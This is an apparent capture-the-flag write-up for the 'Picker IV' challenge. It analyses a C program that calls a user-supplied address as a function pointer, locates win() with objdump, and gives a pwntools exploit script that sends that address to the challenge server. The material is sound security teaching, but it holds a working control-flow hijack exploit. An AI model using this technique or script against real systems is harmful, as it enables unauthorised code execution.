# Cylabacademy - Picker IV Writeup (Automated Exploit & Comprehensive Architectural Analysis)

This repository contains a fully automated exploit script and an in-depth architectural vulnerability breakdown for the **Picker IV** challenge from cylabacademy. This challenge demonstrates how arbitrary execution flow hijacking can be achieved via insecure function pointer redirection when input validation is absent and binary layout compilation settings are left unhardened.

---

## 1. Challenge Architecture & Source Code
The application is written in C and provides the user with direct, unfiltered control over code execution by asking for a target memory address in hexadecimal format (excluding the `0x` prefix). It then instantiates a raw function pointer using that address and executes it.

The ultimate objective is to force the program to jump to the `win()` function, which opens and reads the contents of `flag.txt` from the disk.

### Source Code Setup
```c
int win() {
  FILE *fptr;
  char c;
  printf("You won!\n");
  fptr = fopen("flag.txt", "r");
  // ... reads and prints flag ...
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0);

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  // Instantiating a function pointer using user-controlled input
  void (*foo)(void) = (void (*)())val;
  foo(); // Direct redirection of the CPU Instruction Pointer (RIP/EIP)
}
```

---

## 2. In-Depth Vulnerability Analysis

### The Flaw: Insecure Function Pointer Dereferencing
A function pointer in C is a variable that stores the memory address of executable code rather than standard data values. When the application executes the line `foo();`, the CPU shifts its Instruction Pointer (`RIP` on x86_64 architecture) directly to the numerical memory address stored inside the `val` variable.

The vulnerability stems from **two critical architectural failures**:
1. **Total Absence of Input Validation:** The program blindly trusts the user's input. There is no whitelist, boundaries check, or sanitization matrix ensuring that the address pointing to `val` belongs to an authorized control flow block.
2. **Missing Binary Hardening (No PIE):** Position Independent Executable (**PIE**) is a modern compiler defense mechanism that randomizes the locations of functions in RAM (via ASLR) every single time a program runs. Because PIE is disabled in this binary, the virtual memory layout remains entirely static, making all function entry points permanent and completely predictable across every instance.

### The Attack Strategy: Locating the Dormant Symbol
Static analysis of the source code reveals that `win()` is a "dead function"—meaning it is defined in the codebase but never actively called anywhere within the standard `main()` execution thread. However, since `main()` permits us to jump anywhere, we can stitch these two realities together.

When a C program is compiled without being explicitly stripped, the compiler embeds a **Symbol Table** (`.symtab`) inside the ELF binary wrapper. This table acts as a structured map, linking human-readable function names to their absolute location inside the code segment (`.text`).

We can query this structural map natively in Linux using `objdump`:
```bash
objdump -t picker-IV | grep win
```

The output yields the precise, absolute virtual memory address mapping for the target routine:
```text
00000000004012a1 g     F .text	00000000000000a2              win
```

* **`4012a1`**: The static hex address where the `win()` function begins.
* **`.text`**: Confirms it lives inside the executable code segment.

By feeding the string token `4012a1` into the `scanf` prompt, `foo()` resolves directly to the memory bounds of `win()`. The CPU jumps right into the file-reading sequence, completely bypassing the normal termination checks.

---

## 3. Automated Exploit Script (`exploit.py`)

This standalone Python script utilizes the `pwntools` framework to handle the connection lifecycle, network prompt synchronization, payload injection, and flag extraction automatically.

```python
#!/usr/bin/env python3
from pwn import *


context.log_level = 'info'


HOST = 'xebec.cylabacademy.net'
PORT = 12345  

def main():
    try:
        log.info(f"Connecting to remote target {HOST}:{PORT}...")
        p = remote(HOST, PORT)
        
        # Static symbol address extracted via 'objdump -t' analysis
        win_address = "4012a1" 
        
        log.info(f"Target 'win' function entry point located at: 0x{win_address}")
        
        # 1. Wait for the application address prompt
        p.recvuntil(b"excluding '0x': ")
        
        # 2. Inject the raw hex address to hijack the function pointer execution
        log.info("Injecting address token to hijack control flow execution...")
        p.sendline(win_address.encode())
        
        # 3. Capture the stdout response containing the flag output stream
        log.info("Capturing program execution response...")
        output = p.recvall(timeout=5).decode('utf-8', errors='ignore')
        
        print("\n" + "=" * 60)
        print(f"[+] SERVER RESPONSE:\n{output.strip()}")
        print("=" * 60 + "\n")
        
    except Exception as e:
        log.exception(f"Exploit pipeline failed execution: {e}")

if __name__ == '__main__':
    main()
```

---
